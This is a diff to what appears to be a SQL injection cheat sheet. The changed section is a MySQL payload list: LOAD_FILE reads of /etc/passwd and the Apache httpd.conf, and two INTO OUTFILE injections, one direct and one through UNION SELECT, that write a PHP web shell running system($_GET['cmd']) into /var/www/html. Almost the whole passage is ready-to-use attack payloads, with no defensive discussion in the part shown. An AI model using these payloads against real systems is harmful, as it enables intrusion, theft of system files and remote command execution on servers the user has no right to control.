@@ -58,15 +58,15 @@ After stuffing the input fields you should either obtain access to the system as
 # File read
 ' SELECT LOAD_FILE('/etc/passwd')
 
-# Create webshell
+# Grab web config info
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
-SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--
+
+# Create webshell
+' SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--
 
 OR
 
-LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" --
-
 ```
 
 #### MSSQL
